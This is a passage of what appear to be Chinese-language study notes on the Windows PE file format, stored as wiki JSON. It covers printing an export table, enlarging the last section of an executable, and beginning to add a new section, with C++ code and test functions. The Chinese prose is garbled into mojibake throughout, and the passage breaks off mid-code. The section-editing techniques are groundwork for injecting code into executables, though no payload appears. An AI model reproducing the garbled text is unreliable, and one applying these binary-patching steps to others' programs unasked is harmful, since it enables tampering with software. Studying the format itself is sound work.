å¦‚æœåœ¨åºå·è¡¨æ‰¾å¾—åˆ°ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°åœ°å€æœ‰åå­—ã€‚æ‹¿ç€åŒ¹é…åˆ°çš„ç´¢å¼•å·æ¥ç€å»åç§°è¡¨å¾—åˆ°å‡½æ•°åå­— å¦‚æœå¦‚æœåœ¨åºå·è¡¨æ‰¾ä¸åˆ°ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°åœ°å€æ²¡æœ‰åå­—ï¼Œæ˜¯æŒ‰åºå·å¯¼å‡ºçš„ã€‚Funciton Nameé‚£ä¸€åˆ—å°±æ‰“å°â€œ-â€è¡¨ç¤ºæ²¡åå­—ã€‚çœŸå®åºå·å°±æ˜¯+Baseå¾—åˆ°çš„ ä¾‹ï¼šæœ‰å‡½æ•°åçš„ä¾‹å­ å‡½æ•°åœ°å€è¡¨ç¬¬0é¡¹ï¼Œå‡½æ•°åœ°å€é0ã€‚ æ‹¿ç€ç´¢å¼•å·0å»åºå·è¡¨çœ‹èƒ½å¦æ‰¾åˆ°è¡¨é¡¹ä¸º0çš„ã€‚æœ‰ï¼Œåºå·è¡¨ç¬¬2é¡¹çš„å€¼ä¸º0ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°åœ°å€æœ‰åå­—ã€‚ é‚£ä¹ˆæ¥ç€æ‹¿ç´¢å¼•å·2å»åç§°è¡¨æŸ¥è¡¨ï¼ŒæŸ¥åˆ°å‡½æ•°åç§°ä¸ºPlus ä¾‹ï¼šæ— å‡½æ•°åçš„ä¾‹å­ å‡½æ•°åœ°å€è¡¨ç¬¬4é¡¹ï¼Œå‡½æ•°åœ°å€é0ã€‚ æ‹¿ç€ç´¢å¼•å·4å»åºå·è¡¨çœ‹èƒ½å¦æ‰¾åˆ°è¡¨é¡¹ä¸º4çš„ã€‚æ²¡æœ‰ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°åœ°å€æ˜¯åºå·å¯¼å‡ºçš„ï¼ŒçœŸå®åºå·æ˜¯ç´¢å¼•å·4åŠ ä¸ŠBase ä»£ç å®ç° å‡½æ•°å®ç°æµ‹è¯•å‡½æ•°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758VOID PEManipulator::PrintMergedExportTable()&#123; // è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; printf(&quot;Failed to get export directory pointer. &quot;); return; &#125; // è·å–å‡½æ•°åœ°å€è¡¨ã€å‡½æ•°åç§°è¡¨å’Œå‡½æ•°åºå·è¡¨çš„æŒ‡é’ˆ DWORD dwFunctionTableFOA, dwNameTableFOA, dwOrdinalTableFOA; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA) || !RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA) || !RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; printf(&quot;Failed to convert RVAs to FOAs. &quot;); return; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); printf(&quot;Real Index\\tOrdinal\\tFunction RVA\\tFunction FOA\\tFunction Name &quot;); printf(&quot;----------\\t-------\\t------------\\t------------\\t------------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++) &#123; DWORD dwFunctionRVA = pFunctionTable[i]; if (dwFunctionRVA == 0) // Skip empty entries continue; DWORD dwFunctionFOA; if (!RVAToFOA(dwFunctionRVA, dwFunctionFOA)) continue; // Initialize function name as not found const char* cpFunctionName = &quot;-&quot;; DWORD dwRealIndex = i + pExportDirectory-&gt;Base; // Calculate real index // Try to find a matching ordinal in the ordinal table to get the name index for (DWORD j = 0; j &lt; pExportDirectory-&gt;NumberOfNames; j++) &#123; if (pOrdinalTable[j] == i) &#123; DWORD dwNameRVA = pNameTable[j]; DWORD dwNameFOA; if (RVAToFOA(dwNameRVA, dwNameFOA)) &#123; cpFunctionName = (char*)((DWORD)m_lpFileBuffer + dwNameFOA); break; &#125; &#125; &#125; printf(&quot;%d\\t\\t%u\\t0x%08X\\t0x%08X\\t%s &quot;, dwRealIndex, i, dwFunctionRVA, dwFunctionFOA, cpFunctionName); &#125;&#125;12345678910111213141516171819//æµ‹è¯•æ‰“å°å¯¼å‡ºè¡¨åˆå¹¶åçš„ä¸‰å¼ å­è¡¨ï¼ŒåƒLordPEé‚£æ ·int TestPrintMergedExportTable()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VCçš„ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintMergedExportTable(); return 0;&#125;"},{"title":"æ‰©å¤§èŠ‚","path":"/wiki/PE/æ‰©å¤§èŠ‚.html","content":"å‰è¨€ ä¹‹å‰è®²è¿‡äº†å¦‚ä½•åœ¨ç©ºç™½åŒºæ·»åŠ ä»£ç ï¼Œä½†å¦‚æœè¦æ·»åŠ çš„ä»£ç æ¯”è¾ƒå¤šï¼Œç©ºç™½åŒºä¸å¤Ÿç”¨ï¼Œæ€ä¹ˆåŠã€‚å…¶ä¸­ä¸€ä¸ªåŠæ³•æ˜¯ï¼šæ‰©å¤§èŠ‚ã€‚ æ‰©å¤§èŠ‚ ä»æ“ä½œä¸Šè®²ï¼Œæ‰©å¤§æœ€åä¸€ä¸ªèŠ‚æ¯”è¾ƒç®€å•ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™éœ€è¦å°†å‡†å¤‡æ‰©å¤§çš„èŠ‚åé¢çš„èŠ‚éƒ½è¦ç§»åŠ¨ã€‚å‡è®¾ä¸€ä¸ªPEæ–‡ä»¶æœ‰3ä¸ªèŠ‚ï¼Œå¦‚æœæˆ‘ä»¬é€‰æ‹©æ‰©å¤§ç¬¬1ä¸ªèŠ‚ï¼Œå°±éœ€è¦å°†ç¬¬2å’Œç¬¬3ä¸ªèŠ‚çš„èŠ‚æ•°æ®å¾€åç§»ï¼Œå°±ä¼šæ¯”è¾ƒéº»çƒ¦ã€‚æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚ä¼šæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œä»¥æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚ä¸ºä¾‹ï¼Œæ¯”è¾ƒç®€ä¾¿çš„æ­¥éª¤å¦‚ä¸‹ï¼š åœ¨æœ€åä¸€ä¸ªèŠ‚çš„æœ«å°¾æ·»åŠ è¦å¢åŠ çš„ç©ºé—´ï¼Œå‡è®¾å¤§å°è®°ä¸ºSï¼ˆè¿™ä¸ªæ˜¯å†…å­˜å¯¹é½å€æ•°çš„å€¼ï¼‰ åœ¨èŠ‚è¡¨ä¸­ä¿®æ”¹å¦‚ä¸‹å­—æ®µï¼š æœ€åä¸€ä¸ªèŠ‚çš„SizeOfRawDataå’ŒVirtualSizeéƒ½ä¿®æ”¹ä¸ºN N=max{èŠ‚.SizeOfRawDataï¼ŒèŠ‚.VirtualSize}çš„å€¼æŒ‰å†…å­˜å¯¹é½å + S ä¿®æ”¹SizeOfImage=åŸSizeOfImage + S æ³¨æ„æ˜¯å¦éœ€è¦è¿™ä¸ªèŠ‚å¢åŠ å¯æ‰§è¡Œå±æ€§ å†ç®€ä¾¿ç‚¹ï¼Œæœ€åä¸€ä¸ªèŠ‚çš„SizeOfRawDataå’ŒVirtualSizeï¼ŒSizeOfImageéƒ½ç›´æ¥åŠ ä¸Š0x1000 æ›´ä¸¥è°¨çš„è®¡ç®—æ–¹æ³•ï¼š åœ¨æœ€åä¸€ä¸ªèŠ‚çš„æœ«å°¾æ·»åŠ è¦å¢åŠ çš„ç©ºé—´ï¼Œå‡è®¾å¤§å°è®°ä¸ºSï¼ˆä»»æ„æ•°å€¼ï¼‰ åœ¨èŠ‚è¡¨ä¸­ä¿®æ”¹å¦‚ä¸‹å­—æ®µï¼š æœ€åä¸€ä¸ªèŠ‚çš„èŠ‚.SizeOfRawDataä¿®æ”¹ä¸ºåŸSizeOfRawData+SæŒ‰æ–‡ä»¶å¯¹é½åçš„å¤§å° æœ€åä¸€ä¸ªèŠ‚çš„èŠ‚.VirtualSizeä¿®æ”¹ä¸ºåŸVirtualSize+SæŒ‰å†…å­˜å¯¹é½åçš„å¤§å° ä¿®æ”¹SizeOfImage=åŸSizeOfImage+SæŒ‰å†…å­˜å¯¹é½åçš„å¤§å° æ³¨æ„æ˜¯å¦éœ€è¦è¿™ä¸ªèŠ‚å¢åŠ å¯æ‰§è¡Œå±æ€§ ç¼–ç¨‹å®ç° è‰ç¨¿ï¼šä¸ºäº†å’Œæ–°å¢èŠ‚çš„æµç¨‹ç»Ÿä¸€ï¼Œæ‰©å¤§èŠ‚è¿™é‡Œä¹Ÿæ˜¯åœ¨ImageBufferä¸Šæ”¹å®Œæœ€åä¸€ä¸ªèŠ‚çš„ä¿¡æ¯ï¼Œç„¶ååœ¨å¼„åˆ°NewImageBufferï¼Œå†-&gt;NewFileBufferï¼Œå†å­˜ç›˜ 0413:æ”¹äº†ï¼ŒExtendTheLastSectionå‡½æ•°é‡Œå°±åˆ†é…NewImageBufferè¿”å›å‡ºæ¥ è·å–ImageBufferä¸Šç›¸å…³çš„PEå¤´æŒ‡é’ˆ 1234567891011121314PEHeaders ImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr;&#125;printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;);if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr;&#125; è®¡ç®—NewImageBufferå¤§å°ï¼Œç”³è¯·è¯¥å¤§å°çš„ç©ºé—´å¹¶å¡«å……ä¸º0ï¼Œç„¶åå°†ImageBufferæ‹·è´åˆ°NewImageBuffer 1234567//æ ¹æ®æ–°çš„SizeOfImageæ¥ä¸ºNewImageBufferç”³è¯·å†…å­˜å¤§å°DWORD dwNewImageBufferSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwExtendSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); // ç”³è¯·æ–°ç©ºé—´æ”¾åˆ°NewImageBufferLPVOID lpNewImageBuffer = new BYTE[dwNewImageBufferSize](); //since C++11 ,it&#x27;s okprintf(&quot;[+] new for NewImageBuffer successfully. &quot;);memcpy(lpNewImageBuffer, m_lpImageBuffer, ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage); è·å–NewImageBufferä¸­ç›¸å…³çš„PEå¤´æŒ‡é’ˆï¼Œæ›´æ–°èŠ‚è¡¨ä¸­çš„å­—æ®µ 1234567891011121314151617181920//è·å–NewImageBufferåŒºçš„æ–°çš„PEå¤´æŒ‡é’ˆPEHeaders NewImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(lpNewImageBuffer, NewImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr;&#125;printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;);if (!NewImagePEHeaders.DosHdr || !NewImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !NewImagePEHeaders.PeHdr || !NewImagePEHeaders.OptionalPeHdr || !NewImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr;&#125;//æ›´æ–°èŠ‚è¡¨ä¿¡æ¯PIMAGE_SECTION_HEADER pSecHdrToLastSection = NewImagePEHeaders.SecHdr + (NewImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//æœ€åä¸€ä¸ªèŠ‚è¡¨pSecHdrToLastSection-&gt;SizeOfRawData += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;FileAlignment);pSecHdrToLastSection-&gt;Misc.VirtualSize += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment);//pSecHdrToLastSection-&gt;Characteristics //æ ¹æ®éœ€è¦ä¿®æ”¹å±æ€§ æ›´æ–°SizeOfImageå­—æ®µ 1NewImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); æ³¨ï¼šAlignUpå‡½æ•° 1234567//VOID ImageBufferToNewImageBuffer();// This function aligns a given size up // to the nearest multiple of the alignment value.DWORD AlignUp(DWORD dwSize, DWORD dwAlignment) &#123;\treturn (dwSize + dwAlignment - 1) &amp; ~(dwAlignment - 1);&#125; å®Œæ•´ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152LPVOID PEManipulator::ExtendTheLastSection(DWORD dwExtendSize)&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr; &#125; //ç°åœ¨çš„èŠ‚è¡¨å­—æ®µè¿˜æ˜¯åŸæ¥çš„ï¼Œå¼„åˆ°NewImageBuffer //æ ¹æ®æ–°çš„SizeOfImageæ¥ä¸ºNewImageBufferç”³è¯·å†…å­˜å¤§å° DWORD dwNewImageBufferSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwExtendSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); // ç”³è¯·æ–°ç©ºé—´æ”¾åˆ°NewImageBuffer LPVOID lpNewImageBuffer = new BYTE[dwNewImageBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewImageBuffer successfully. &quot;); memcpy(lpNewImageBuffer, m_lpImageBuffer, ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage); //è·å–NewImageBufferåŒºçš„æ–°çš„PEå¤´æŒ‡é’ˆ PEHeaders NewImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(lpNewImageBuffer, NewImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!NewImagePEHeaders.DosHdr || !NewImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !NewImagePEHeaders.PeHdr || !NewImagePEHeaders.OptionalPeHdr || !NewImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr; &#125; //æ›´æ–°èŠ‚è¡¨ä¿¡æ¯ PIMAGE_SECTION_HEADER pSecHdrToLastSection = NewImagePEHeaders.SecHdr + (NewImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//æœ€åä¸€ä¸ªèŠ‚è¡¨ pSecHdrToLastSection-&gt;SizeOfRawData += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;FileAlignment); pSecHdrToLastSection-&gt;Misc.VirtualSize += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); //pSecHdrToLastSection-&gt;Characteristics //æ ¹æ®éœ€è¦ä¿®æ”¹å±æ€§ NewImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); printf(&quot; [+] The last section has been extended successfully. &quot;); return lpNewImageBuffer;&#125; æµ‹è¯• 12345678910111213141516171819202122232425262728293031//æµ‹è¯•æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚int TestExtendTheLastSection()&#123; //ç”¨ä¾‹1ï¼šfg.exe æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ //PEManipulator PEFile(&quot;E:\\\\temp\\\\ExtendTheLastSection\\\\fg.exe&quot;); //ç”¨ä¾‹2ï¼šnotepad.exe æ–‡ä»¶å¯¹é½200h å†…å­˜å¯¹é½1000h PEManipulator PEFile(&quot;E:\\\\temp\\\\ExtendTheLastSection\\ otepad.exe&quot;); if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.FileBufferToImageBuffer(); LPVOID lpNewImageBuffer = PEFile.ExtendTheLastSection(0x870); if (lpNewImageBuffer == nullptr) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewImageBuffer; &#125;); PEFile.NewImageBufferToNewFileBuffer(lpNewImageBuffer); if (!PEFile.SaveFile(3)) &#123; return 1; &#125; return 0;&#125; æ‰©å¤§ä»»æ„èŠ‚ æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæ‰©å¤§ä¸­é—´çš„èŠ‚ï¼Œè¦å°†åé¢çš„èŠ‚åç§»ï¼Œè¿˜è¦ä¿®æ­£éƒ¨åˆ†é‡å®šä½æ•°æ®ï¼Œæ¯”è¾ƒéº»çƒ¦å°±æ˜¯äº†ã€‚ç›¸å…³èµ„æºå¦‚ä¸‹ï¼Œå…ˆè®°å½•ï¼Œæœªæ¥æœ‰éœ€è¦å†çœ‹ æ‰©å¤§.textèŠ‚ï¼šhttps://github.com/Neo-Maoku/expandTextSection æ‰©å¤§ä»»æ„èŠ‚ï¼šhttps://bbs.kanxue.com/thread-84932.htm"},{"title":"æ–°å¢èŠ‚","path":"/wiki/PE/æ–°å¢èŠ‚.html","content":"å‰è¨€ æ‰©å¤§èŠ‚çš„é—®é¢˜ï¼š æ·»åŠ çš„ä¸œè¥¿å’ŒåŸæœ‰çš„æ•°æ®æ··åœ¨ä¸€èµ· æœ€åä¸€ä¸ªèŠ‚åŸæ¥æ˜¯ä¸€äº›åªè¯»çš„æ•°æ®ï¼Œå¦‚æœæ–°åŠ çš„æ˜¯ä»£ç ï¼Œè¿˜è¦æ”¹èŠ‚å±æ€§ æ­¥éª¤ åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨ æœ€åä¸€ä¸ªèŠ‚è¡¨çš„åé¢è¿˜è¦æœ‰1ä¸ªå…¨ä¸º0çš„èŠ‚è¡¨ï¼ˆ40ä¸ªå­—èŠ‚ï¼‰æ”¶å°¾ã€‚ è™½ç„¶æ²¡æœ‰è¿™ä¸ªâ€œç©ºèŠ‚è¡¨â€æˆ–è¿™ä¸ªç©ºèŠ‚è¡¨é‡Œçš„å€¼ä¸å…¨ä¸º0ï¼Œexeä¹Ÿèƒ½æ­£å¸¸è¿è¡Œã€‚ä½†æœ€å¥½è¿˜æ˜¯éµå®ˆè¿™ä¸ªè§„å®šï¼Œwindowså¾ˆå¤šç»“æ„ä½“éƒ½æ˜¯ä»¥ä¸€ä¸ªå…¨é›¶ç»“æ„ä½“æ”¶å°¾ä½œä¸ºç»“æŸæ ‡è®° æ‰€ä»¥åˆ¤æ–­æ¡ä»¶æ˜¯åˆ¤æ–­å‰©ä½™ç©ºé—´æ˜¯å¦â‰¥ï¼ˆè¦æ–°å¢èŠ‚çš„æ•°é‡+1ï¼‰* 40å­—èŠ‚ï¼Œå…¶ä¸­ï¼Œå‰©ä½™ç©ºé—´=SizeOfHeaders-DOSéƒ¨åˆ†-PEæ ‡è¯†-æ ‡å‡†PEå¤´-æ‰©å±•PEå¤´-ç°æœ‰èŠ‚è¡¨å çš„ç©ºé—´ã€‚ä¾‹ï¼šæ‰“ç®—æ–°å¢1ä¸ªèŠ‚ï¼Œé‚£ä¹ˆå‰©ä½™ç©ºé—´å°±è¦è‡³å°‘å‰©80ä¸ªå­—èŠ‚ï¼Œ40ä¸ªå­—èŠ‚æ”¾æ–°å¢åŠ çš„èŠ‚è¡¨ï¼Œå¦å¤–40ä¸ªå­—èŠ‚ä½œä¸ºæ”¶å°¾çš„å…¨0èŠ‚è¡¨ã€‚ æ¯”å¦‚winxpä¸‹çš„notepadï¼Œç¼–è¯‘å™¨åœ¨èŠ‚è¡¨åæºäº†ä¸€å †ä¸œè¥¿ï¼Œè¿™å †ä¸œè¥¿å¯èƒ½æœ‰ç”¨ï¼Œä¹Ÿå¯èƒ½æ²¡ç”¨ï¼Œä¸ºäº†ä¿é™©æˆ‘ä»¬ä¸å»è¦†ç›–è¿™äº›æ•°æ®ã€‚ç©ºé—´ä¸å¤Ÿå¯ä»¥å°†æ•´ä¸ªNTå¤´ä¸Šç§»ï¼Œå ç”¨DOS Stubæ•°æ®çš„ç©ºé—´ï¼Œç„¶åæ”¹e_lfanewå­—æ®µã€‚å¦‚æœè¿™ç§åŠæ³•ä¹Ÿä¸è¡Œï¼ˆæå°‘æƒ…å†µï¼‰ï¼Œåªèƒ½æ‰©å¤§èŠ‚äº†ã€‚ åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜ï¼Œå¡«å†™å„ä¸ªå­—æ®µï¼ˆå¯ä»¥å¯¹ç€æŠ„.textèŠ‚çš„èŠ‚è¡¨çš„å­—æ®µï¼‰ Nameï¼šèŠ‚çš„åå­—ï¼Œéšä¾¿èµ· Misc.VirtualSizeï¼ˆå†…å­˜ä¸­çš„å¤§å°ï¼Œä¹Ÿæ˜¯å¯¹é½å‰çš„å¤§å°ï¼‰ï¼šç›´æ¥æŒ‰å¯¹é½åå†™ï¼Œä¸ç”¨æƒ³å®é™…ç”¨åˆ°å¤šå°‘ã€‚æ¯”å¦‚å¯èƒ½åªç”¨åˆ°20ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œç›´æ¥æŒ‰å¯¹é½SectionAlighmentï¼ˆ0x1000ï¼‰åå¡«ï¼Œæ¯”å¦‚0x1000ã€‚ VirtualAddressï¼šä¸¤ç§è®¡ç®—æ–¹å¼ è®¡ç®—æ–¹å¼ä¸€ï¼šèŠ‚è¡¨ä¸­æœ€åä¸€ä¸ªèŠ‚çš„VirtualAddress+max{VirtualSizeï¼ŒSizeOfRawData}ã€‚å¦‚æœæ˜¯VirtualSize&gt;SizeOfRawDataï¼Œè¦å–VirtualSizeæŒ‰å†…å­˜å¯¹é½åçš„å€¼ ä¾‹ï¼šå€’æ•°ç¬¬äºŒä¸ªèŠ‚å’Œæœ€åä¸€ä¸ªèŠ‚èŠ‚è¡¨éƒ¨åˆ†å­—æ®µå¦‚ä¸‹ï¼š èŠ‚ å­—æ®µ å€¼ æœ€åä¸€ä¸ªèŠ‚ VirtualSize 5FD8 VirtualAddress 23000 SizeOfRawData 4000 PointerToRawData 23000 VirtualSize(5FD8)&gt;SizeOfRawData(4000)ï¼Œæ–°æ·»åŠ çš„èŠ‚è¦ä»VirtualAddressï¼ˆ23000ï¼‰+VirtualSizeæŒ‰SectionAlignmentå¯¹é½åçš„å¤§å°ï¼ˆ6000hï¼‰=29000hå¼€å§‹æ”¾ ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹æœ€åä¸€ä¸ªèŠ‚ä¸æ˜¯æ•°æ®åŒºï¼Œåªæœ‰è¿™ä¸ªèŠ‚å› ä¸ºå«æœ‰åˆå§‹åŒ–æ•°æ®æ‰ä¼šå¯¼è‡´VirtualSize&gt;SizeOfRawData è®¡ç®—æ–¹å¼äºŒï¼šSizeOfImage SizeOfRawDataï¼ˆæ–‡ä»¶ä¸­çš„å¤§å°ï¼Œè¿™ä¸ªå€¼ä¹Ÿæ˜¯æŒ‰æ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼šè¿™ä¸ªå€¼è¦æŒ‰æ–‡ä»¶å¯¹é½ã€‚æ¯”å¦‚VirtualAddresså†™äº†0x1000ï¼Œå³ä½¿æ–‡ä»¶å¯¹é½å€¼æ˜¯200hï¼Œè¿™é‡Œä¹Ÿå†™0x1000ã€‚ æ€»ä¹‹ï¼ŒMisc.VirtualSizeå’ŒSizeOfRawDataéƒ½æŒ‰å¯¹é½åå†™æ¯”è¾ƒæ–¹ä¾¿ã€‚ PointerToRawDataï¼šèŠ‚è¡¨ä¸­æœ€åä¸€ä¸ªèŠ‚çš„PointerToRawData+SizeOfRawData PointerToRelocationsï¼šæ²¡å•¥ç”¨ï¼Œå¡«0 PointerToLinenumbersï¼šæ²¡å•¥ç”¨ï¼Œå¡«0 NumberOfRelocationsï¼šæ²¡å•¥ç”¨ï¼Œå¡«0 NumberOfLinenumbersï¼šæ²¡å•¥ç”¨ï¼Œå¡«0 Characteristicsï¼šçœ‹æ˜¯å¦éœ€è¦è¿™ä¸ªèŠ‚å¢åŠ å¯æ‰§è¡Œå±æ€§ æ›´æ–°PEå¤´ä¸­èŠ‚çš„æ•°é‡ æ›´æ–°SizeOfImageçš„å¤§å° åŸSizeOfImage+æ–°å¢èŠ‚.VirtualSizeæŒ‰å†…å­˜å¯¹é½åçš„å€¼ åœ¨åŸæœ‰æ•°æ®çš„æœ€åï¼Œæ–°å¢ä¸€ä¸ªèŠ‚çš„æ•°æ®(å†…å­˜å¯¹é½çš„æ•´æ•°å€) ç¬”è®°å‚è€ƒï¼šæ»´æ°´ä¸‰æœŸï¼šday33.1-æ–°å¢èŠ‚ã€æ‰©å¤§èŠ‚-æ·»åŠ ä»£ç  ç¼–ç¨‹å®ç° å› ä¸ºImageBufferçš„ç©ºé—´æ˜¯äº‹å…ˆç”³è¯·å¥½çš„æŒ‡å®šå¤§å°ï¼Œæ²¡æ³•åœ¨å°¾å·´è¿½åŠ ã€‚æ‰€ä»¥åœ¨ImageBufferä¸Šæ“ä½œ1-4æ­¥ï¼Œç„¶åæ–°ç”³è¯·å¤§å°ä¸ºåŸSizeOfImage+æ‰©å¤§çš„å­—èŠ‚æ•°å¤§å°çš„NewImageBufferï¼Œç„¶åå°†ImageBufferä¾æ¬¡æ‹·åˆ°NewImageBufferã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼åœ¨å°¾å·´â€œæ–°å¢èŠ‚æ•°æ®â€ã€‚ ä»£ç æ˜¯åœ¨ImageBufferä¸Šæ“ä½œï¼Œå…ˆè·å–ImageBufferä¸Šç›¸å…³çš„PEå¤´æŒ‡é’ˆ 1234567891011121314PEHeaders ImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of ImageBuffer failed &quot;, __func__); return FALSE;&#125;printf(&quot; [+] Extract the PE Pointers of ImageBuffer successfully. &quot;);if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125; åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨ åˆ¤æ–­æ¡ä»¶1ï¼šå‰©ä½™ç©ºé—´=SizeOfHeaders-DOSæ€»å¤§å°ï¼ˆDOS MZ+Dos Stubï¼‰-NTå¤´æ€»å¤§å°ï¼ˆNTå¤´+æ ‡å‡†PEå¤´+æ‰©å±•PEå¤´ï¼‰-èŠ‚è¡¨æ€»å¤§å° æ˜¯å¦ &gt; 80ã€‚ 123456789101112//1ã€åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨// è®¡ç®—å„ä¸ªéƒ¨åˆ†çš„å¤§å°DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // 